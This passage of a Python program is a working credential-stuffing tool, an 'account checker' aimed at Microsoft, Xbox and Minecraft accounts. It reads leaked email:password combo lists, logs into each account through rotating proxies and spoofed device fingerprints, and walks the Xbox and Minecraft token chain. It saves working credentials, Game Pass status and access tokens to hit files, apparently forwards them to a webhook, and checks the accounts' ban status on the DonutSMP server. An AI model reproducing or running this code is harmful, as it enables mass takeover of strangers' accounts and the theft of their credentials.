        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT"
    }
    r = session.post(url, json=payload)
    r.raise_for_status()
    data = r.json()
    xbox_token = data["Token"]
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    return xbox_token, uhs

def xbox_xsts(xbox_token):
    device_fp = generate_device_fingerprint()
    session = FingerprintedSession(device_fp)
    url = "https://xsts.auth.xboxlive.com/xsts/authorize"
    payload = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbox_token]
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT"
    }
    r = session.post(url, json=payload)
    r.raise_for_status()
    data = r.json()
    xsts_token = data["Token"]
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    return xsts_token, uhs

def get_mc_access_token(uhs, xsts_token):
    device_fp = generate_device_fingerprint()
    session = FingerprintedSession(device_fp)
    url = "https://api.minecraftservices.com/authentication/login_with_xbox"
    payload = {
        "identityToken": f"XBL3.0 x={uhs};{xsts_token}"
    }
    r = session.post(url, json=payload)
    r.raise_for_status()
    return r.json()["access_token"]

def get_mc_profile(mc_access_token):
    device_fp = generate_device_fingerprint()
    session = FingerprintedSession(device_fp)
    url = "https://api.minecraftservices.com/minecraft/profile"
    headers = {"Authorization": f"Bearer {mc_access_token}"}
    r = session.get(url, headers=headers)
    r.raise_for_status()
    data = r.json()
    return data["name"], data["id"]

def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config, capture_obj=None):
    result = None
    disconnect_message = None
    email, password = combo.split(":", 1)
    auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
    auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
    
    try:
        connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})

        @connection.listener(clientbound.login.DisconnectPacket, early=True)
        def login_disconnect(packet):
            nonlocal result, disconnect_message
            try:
                msg = str(packet.json_data)
            except Exception:
                msg = ""
            disconnect_message = msg
            result = "banned"

        @connection.listener(clientbound.play.JoinGamePacket, early=True)
        def joined_server(packet):
            nonlocal result
            result = "unbanned"

        connection.connect()
        c = 0
        while result is None and c < 1000:
            time.sleep(0.01)
            c += 1

        if result == "unbanned":
            print(Fore.GREEN + f"[UNBANNED] {combo} | Logged in as {mc_name} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Unbanned.txt", f"{combo} | {mc_name} | Session: {SESSION_ID}")
            if config.getboolean("Settings", "SaveCapture"):
                cap = Capture(email, password, "", "", "", "", "DonutSMP - Unbanned", mc_name, mc_uuid, mc_token, "unbanned", "", "", "")
                save_result(folder, "Capture.txt", cap.builder())
            time.sleep(1)
        elif result == "banned":
            if disconnect_message:
                clean = re.sub(r'§.', '', disconnect_message)
                reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
                reason = reason_match.group(1).strip() if reason_match else "banned (unknown reason)"
                time_match = re.search(r'Time Left: ([^\n\\]+)', clean)
                time_left = time_match.group(1).strip() if time_match else ""
                banid_match = re.search(r'Ban ID: ([^\n\\]+)', clean)
                ban_id = banid_match.group(1).strip() if banid_match else ""
                fields = [reason, f"Time Left: {time_left}" if time_left else "", f"Ban ID: {ban_id}" if ban_id else ""]
                output = '.'.join([f for f in fields if f])
                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: {output} | Session: {SESSION_ID}" + Style.RESET_ALL)
                save_result(folder, "DonutSMP_Banned.txt", f"{combo} | {mc_name} | {output} | Session: {SESSION_ID}")
                if config.getboolean("Settings", "SaveCapture"):
                    cap = Capture(email, password, "", "", "", "", "DonutSMP - Banned", mc_name, mc_uuid, mc_token, "banned", reason, time_left, ban_id)
                    save_result(folder, "Capture.txt", cap.builder())
            else:
                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: banned (no message) | Session: {SESSION_ID}" + Style.RESET_ALL)
                save_result(folder, "DonutSMP_Banned.txt", f"{combo} | {mc_name} | Status: banned (no message) | Session: {SESSION_ID}")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: unknown error | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: unknown error | Session: {SESSION_ID}")
        connection.disconnect()
    except Exception as e:
        error_str = str(e)
        if "429" in error_str or "Too Many Requests" in error_str:
            print(Fore.RED + f"[BAD] {combo} | Status: too many requests | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: too many requests | Session: {SESSION_ID}")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str} | Session: {SESSION_ID}")
        time.sleep(0.1)

def process_donutsmp_combo(combo, folder, config):
    try:
        email, password = combo.strip().split(":", 1)
        device_fp = generate_device_fingerprint()
        session = FingerprintedSession(device_fp)
        session.headers.update({
            "User-Agent": device_fp.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
        })
        
        if proxytype != "'4'":
            proxy = getproxy()
            if proxy:
                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
        
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if not token or token == "None":
            print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: invalid credentials or 2FA | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Session: {SESSION_ID}")
            time.sleep(0.1)
            return
        
        try:
            xbox_token, uhs = xbox_authenticate(token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 401:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: Xbox authentication failed (401 Unauthorized) | Session: {SESSION_ID}" + Style.RESET_ALL)
            elif e.response.status_code == 429:
                print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: Xbox rate limited (429) | Session: {SESSION_ID}" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: Xbox auth error | {e} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: Xbox auth error | {e} | Session: {SESSION_ID}")
            time.sleep(0.1)
            return
        
        try:
            xsts_token, uhs = xbox_xsts(xbox_token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 401:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: XSTS failed (401 Unauthorized) | Session: {SESSION_ID}" + Style.RESET_ALL)
            elif e.response.status_code == 429:
                print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: XSTS rate limited (429) | Session: {SESSION_ID}" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: XSTS error | {e} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: XSTS error | {e} | Session: {SESSION_ID}")
            time.sleep(0.1)
            return
        
        try:
            mc_access_token = get_mc_access_token(uhs, xsts_token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: Not a Minecraft/Xbox account or region-locked (403) | Session: {SESSION_ID}" + Style.RESET_ALL)
            elif e.response.status_code == 429:
                print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: MC rate limited (429) | Session: {SESSION_ID}" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: MC access error | {e} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: MC access error | {e} | Session: {SESSION_ID}")
            time.sleep(0.1)
            return
        
        try:
            mc_name, mc_uuid = get_mc_profile(mc_access_token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 404:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: No Minecraft profile (account never bought MC) | Session: {SESSION_ID}" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: MC profile error | {e} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: MC profile error | {e} | Session: {SESSION_ID}")
            time.sleep(0.1)
            return
        
        join_donutsmp_bot(mc_name, mc_uuid, mc_access_token, combo, folder, config)
        
    except Exception as e:
        error_str = str(e)
        if "429" in error_str or "Too Many Requests" in error_str:
            print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: error | {error_str} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"[TRY LATER] {combo} | Status: error | {error_str} | Session: {SESSION_ID}")
        else:
            print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: error | {error_str} | Session: {SESSION_ID}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: error | {error_str} | Session: {SESSION_ID}")
        time.sleep(0.1)

# ORIGINAL AUTHENTICATION FUNCTIONS (from main.py)
def authenticate_original(email, password, tries=0):
    global retries, bad, checked, cpm
    try:
        device_fp = generate_device_fingerprint()
        session = FingerprintedSession(device_fp)
        session.verify = False
        session.proxies = getproxy()
        session.headers.update({
            "User-Agent": device_fp.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
        })
        
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', 
                                         json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, 
                                               "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, 
                                         headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token is not None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
                                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, 
                                             "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, 
                                       headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token is not None:
                        access_token = mc_token_original(session, uhs, xsts_token)
                        if access_token is not None:
                            hit = checkmc_original(session, email, password, access_token)
            except: 
                pass
            if hit == False: 
                validmail(email, password)
        else:
            bad += 1
            checked += 1
            cpm += 1
            if screen == "'2'": 
                print(Fore.RED + f"Bad: {email}:{password} | Session: {SESSION_ID}")
    except:
        if tries < maxretries:
            tries += 1
            retries += 1
            authenticate_original(email, password, tries)
        else:
            bad += 1
            checked += 1
            cpm += 1
            if screen == "'2'": 
                print(Fore.RED + f"Bad: {email}:{password} | Session: {SESSION_ID}")
    finally:
        session.close()

def mc_token_original(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                   json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, 
                                   headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) < 1: 
                    time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries += 1
            session.proxies = getproxy()
            continue

def checkmc_original(session, email, password, token):
    global retries, cpm, checked, xgp, xgpu, other
    while True:
        checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', 
                             headers={'Authorization': f'Bearer {token}'}, verify=False)
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu += 1
                cpm += 1
                checked += 1
                if screen == "'2'": 
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {email}:{password} | Session: {SESSION_ID}")
                save_result(f"results/{fname}", "XboxGamePassUltimate.txt", f"{email}:{password}")
                try: 
                    capture_mc_original(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    cap = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                    cap.handle()
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp += 1
                cpm += 1
                checked += 1
                if screen == "'2'": 
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {email}:{password} | Session: {SESSION_ID}")
                save_result(f"results/{fname}", "XboxGamePass.txt", f"{email}:{password}")
                capture_mc_original(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked += 1
                cpm += 1
                capture_mc_original(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other += 1
                    cpm += 1
                    checked += 1
                    items = ', '.join(others)
                    save_result(f"results/{fname}", "Other.txt", f"{email}:{password} | {items}")
                    if screen == "'2'": 
                        print(Fore.YELLOW + f"Other: {email}:{password} | {items} | Session: {SESSION_ID}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries += 1
            session.proxies = getproxy()
            if len(proxylist) < 1: 
                time.sleep(20)
            continue
        else:
            return False

def capture_mc_original(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', 
                           headers={'Authorization': f'Bearer {access_token}'}, verify=False)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                cap = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
                cap.device_fingerprint = session.device_fingerprint if hasattr(session, 'device_fingerprint') else None
                cap.handle()
                break
            elif r.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) < 5: 
                    time.sleep(20)
                continue
            else: 
                break
        except:
            retries += 1
            session.proxies = getproxy()
            continue

def validmail(email, password):
    global vm, cpm, checked
    vm += 1
    cpm += 1
    checked += 1
    save_result(f"results/{fname}", "Valid_Mail.txt", f"{email}:{password}")
    if screen == "'2'": 
        print(Fore.LIGHTMAGENTA_EX + f"Valid Mail: {email}:{password} | Session: {SESSION_ID}")

def Checker(combo, mode="original"):
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            if mode == "donutsmp":
                folder = ensure_results_folder(None)
                config = load_config()
                process_donutsmp_combo(combo, folder, config)
            else:
                authenticate_original(str(email), str(password))
        else:
            if screen == "'2'": 
                print(Fore.RED + f"Bad: {combo.strip()} | Session: {SESSION_ID}")
            bad += 1
            cpm += 1
            checked += 1
    except:
        if screen == "'2'": 
            print(Fore.RED + f"Bad: {combo.strip()} | Session: {SESSION_ID}")
        bad += 1
        cpm += 1
        checked += 1

def load_combos_from_folder():
    global Combos, fname
    combo_folder = "combos"
    if not os.path.exists(combo_folder):
        os.makedirs(combo_folder)
        print(Fore.LIGHTRED_EX + "No combos folder found. Created one. Please add your combo files there and restart.")
        time.sleep(3)
        exit()
    
    combo_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]
    if not combo_files:
        print(Fore.LIGHTRED_EX + "No combo files found in combos folder. Please add some and restart.")
        time.sleep(3)
        exit()
    
    all_combos = []
    for file in combo_files:
        try:
            with open(os.path.join(combo_folder, file), 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                all_combos.extend(lines)
        except:
            print(Fore.LIGHTRED_EX + f"Error reading file: {file}")
    
    if not all_combos:
        print(Fore.LIGHTRED_EX + "No valid combos found in any files.")
        time.sleep(3)
        exit()
    
    Combos = list(set(all_combos))
    print(Fore.LIGHTBLUE_EX + f"[{str(len(all_combos) - len(Combos))}] Dupes Removed.")
    print(Fore.LIGHTBLUE_EX + f"[{len(Combos)}] Combos Loaded from {len(combo_files)} files.")
    fname = "combined_results"

def load_proxies(proxy_file):
    global proxylist
    proxylist = []
    if not os.path.isfile(proxy_file):
        print(Fore.RED + f"Proxy file not found: {proxy_file}" + Style.RESET_ALL)
        return
    with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            proxy = line.strip()
            if proxy:
                proxylist.append(proxy)
    print(Fore.CYAN + f"Loaded {len(proxylist)} proxies." + Style.RESET_ALL)

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    proxy_count = len(proxylist)
    print(f"\rChecked: {checked}/{len(Combos)} | Hits: {hits} | Bad: {bad} | 2FA: {twofa} | SFA: {sfa} | MFA: {mfa} | XGP: {xgp} | XGPU: {xgpu} | Valid Mail: {vm} | Other: {other} | CPM: {cmp1*60} | Retries: {retries} | Errors: {errors} | Proxies: {proxy_count} | Session: {SESSION_ID}", end='', flush=True)
    time.sleep(1)
    threading.Thread(target=logscreen).start()

def cuiscreen():
    global cpm, cpm1
    os.system('cls' if os.name == 'nt' else 'clear')
    cmp1 = cpm
    cpm = 0
    
    logo = Fore.GREEN + '''
     █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗     ██████╗ ███████╗██╗   ██╗
    ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ██╔══██╗██╔════╝██║   ██║
    ███████║██║     ██████╔╝███████║███████║    ██║  ██║█████╗  ██║   ██║
    ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║    ██║  ██║██╔══╝  ╚██╗ ██╔╝
    ██║  ██║███████╗██║     ██║  ██║██║  ██║    ██████╔╝███████╗ ╚████╔╝ 
    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝  ╚═══╝
    '''
    print(logo)
    print(f" Session ID: {SESSION_ID}")
    print(f" Started: {DIGITAL_FINGERPRINT['timestamp']}")
    print(f" Proxies: {len(proxylist)}")
    print(f" [{checked}/{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{sfa}] SFA")
    print(f" [{mfa}] MFA")
    print(f" [{twofa}] 2FA")
    print(f" [{xgp}] Xbox Game Pass")
    print(f" [{xgpu}] Xbox Game Pass Ultimate")
    print(f" [{other}] Other")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    print(f" [CPM: {cmp1*60}]")
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def finishedscreen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.GREEN + "Finished Checking!")
    print(f"Session ID: {SESSION_ID}")
    print(f"Proxies Used: {len(proxylist)}")
    print()
    print("Hits: " + str(hits))
    print("Bad: " + str(bad))
    print("SFA: " + str(sfa))
    print("MFA: " + str(mfa))
    print("2FA: " + str(twofa))
    print("Xbox Game Pass: " + str(xgp))
    print("Xbox Game Pass Ultimate: " + str(xgpu))
    print("Other: " + str(other))
    print("Valid Mail: " + str(vm))
    print(Fore.LIGHTRED_EX + "Press any key to exit.")
    input()
    sys.exit(0)

def Main():
    global proxytype, screen, maxretries, Combos, proxy_last_update
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Display fingerprint info at startup
    print(Fore.CYAN + "=== Digital Fingerprint Information ===" + Style.RESET_ALL)
    print(f"Session ID: {SESSION_ID}")
    print(f"Started: {DIGITAL_FINGERPRINT['timestamp']}")
    print(f"Hostname: {DIGITAL_FINGERPRINT['hostname']}")
    print(f"Platform: {DIGITAL_FINGERPRINT['platform']}")
    print()
    
    # Load configuration
    config = load_config()
    
    # Set config values
    maxretries = int(config.get("Settings", "Max Retries"))
    proxy_update_interval = int(config.get("Settings", "ProxyUpdateInterval"))
    global PROXY_UPDATE_INTERVAL
    PROXY_UPDATE_INTERVAL = proxy_update_interval * 60  # Convert minutes to seconds
    
    config_obj.set('webhook', config.get("Settings", "Webhook"))
    config_obj.set('message', config.get("Settings", "WebhookMessage"))
    config_obj.set('webhook_image', config.get("Settings", "WebhookImage"))
    config_obj.set('webhook_thumbnail', config.get("Settings", "WebhookThumbnail"))
    config_obj.set('proxylessban', str_to_bool(config.get("Settings", "Proxyless Ban Check")))
    config_obj.set('autoscrape', int(config.get("Settings", "Auto Scrape Minutes")))
    
    # Capture settings
    config_obj.set('hypixelname', str_to_bool(config.get("Captures", "Hypixel Name")))
    config_obj.set('hypixellevel', str_to_bool(config.get("Captures", "Hypixel Level")))
    config_obj.set('hypixelfirstlogin', str_to_bool(config.get("Captures", "First Hypixel Login")))
    config_obj.set('hypixellastlogin', str_to_bool(config.get("Captures", "Last Hypixel Login")))
    config_obj.set('optifinecape', str_to_bool(config.get("Captures", "Optifine Cape")))
    config_obj.set('mcapes', str_to_bool(config.get("Captures", "Minecraft Capes")))
    config_obj.set('access', str_to_bool(config.get("Captures", "Email Access")))
    config_obj.set('hypixelsbcoins', str_to_bool(config.get("Captures", "Hypixel Skyblock Coins")))
    config_obj.set('hypixelbwstars', str_to_bool(config.get("Captures", "Hypixel Bedwars Stars")))
    config_obj.set('hypixelban', str_to_bool(config.get("Captures", "Hypixel Ban")))
    config_obj.set('namechange', str_to_bool(config.get("Captures", "Name Change Availability")))
    config_obj.set('lastchanged', str_to_bool(config.get("Captures", "Last Name Change")))
    
    print(Fore.GREEN + "=== DONUTSMP & MINECRAFT ACCOUNT CHECKER ===" + Style.RESET_ALL)
    print()
    print(Fore.LIGHTBLUE_EX + "Select mode:")
    print("1. Original Minecraft Account Checker")
    print("2. DonutSMP Ban Checker")
    print("3. Both (Check accounts then check DonutSMP for hits)")
    
    mode = input(Fore.LIGHTBLUE_EX + "Enter mode (1-3): ").strip()
    
    if mode not in ["1", "2", "3"]:
        print(Fore.RED + "Invalid mode selected.")
        time.sleep(2)
        Main()
    
    try:
        print(Fore.LIGHTBLACK_EX + "(speed for checking, i recommend 100, give more threads if its slow. if proxyless give at most 5 threads.)")
        thread = int(input(Fore.LIGHTBLUE_EX + "Threads: "))
    except:
        print(Fore.LIGHTRED_EX + "Must be a number.") 
        time.sleep(2)
        Main()
    
    print(Fore.LIGHTBLUE_EX + "Proxy Type: [1] Http/s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper (GitHub)")
    proxytype_input = input(Fore.LIGHTBLUE_EX + "Select proxy type (1-5): ")
    proxytype = f"'{proxytype_input}'"
    
    if proxytype_input not in ["1", "2", "3", "4", "5"]:
        print(Fore.RED + f"Invalid Proxy Type [{proxytype_input}]")
        time.sleep(2)
        Main()
    
    if proxytype != "'4'":
        if proxytype == "'5'":
            print(Fore.LIGHTGREEN_EX + "Using auto-scraper from GitHub sources. Proxies will update every 30 minutes." + Style.RESET_ALL)
            # Try to load backup first
            if not load_proxy_backup():
                print(Fore.YELLOW + "No backup found. Fetching fresh proxies..." + Style.RESET_ALL)
            update_proxies_from_github()
        else:
            proxy_file = input("Enter proxy file path: ").strip()
            load_proxies(proxy_file)
    
    print(Fore.LIGHTBLUE_EX + "Screen: [1] CUI - [2] Log")
    screen_input = input(Fore.LIGHTBLUE_EX + "Select screen type (1-2): ")
    screen = f"'{screen_input}'"
    
    print(Fore.LIGHTBLUE_EX + "Loading combos from combos folder...")
    load_combos_from_folder()
    
    if not os.path.exists("results"): 
        os.makedirs("results")
    if not os.path.exists('results/' + fname): 
        os.makedirs('results/' + fname)
    
    if screen == "'1'": 
        cuiscreen()
    elif screen == "'2'": 
        logscreen()
    else: 
        cuiscreen()
    
    # Determine which mode to run
    if mode == "1":
        # Original Minecraft checker
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            futures = [executor.submit(Checker, combo, "original") for combo in Combos]
            concurrent.futures.wait(futures)
    
    elif mode == "2":
        # DonutSMP checker
        folder = ensure_results_folder(None)
        config = load_config()
        
        for combo in Combos:
            Checker(combo, "donutsmp")
    
    elif mode == "3":
        # Both - first check accounts, then check DonutSMP for hits
        print(Fore.YELLOW + "Running account check first...")
        
        # Store hits for later DonutSMP checking
        hits_combos = []
        
        def checker_with_collection(combo):
            Checker(combo, "original")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            futures = [executor.submit(checker_with_collection, combo) for combo in Combos]
            concurrent.futures.wait(futures)
        
        print(Fore.YELLOW + "Now checking hits on DonutSMP...")
        
        # Read hits from file
        hits_file = f"results/{fname}/Hits.txt"
        if os.path.exists(hits_file):
            with open(hits_file, 'r') as f:
                hits_combos = [line.strip() for line in f if line.strip()]
            
            folder = ensure_results_folder(None)
            config = load_config()
            
            for combo in hits_combos:
                Checker(combo, "donutsmp")
    
    finishedscreen()

if __name__ == "__main__":
    Main()
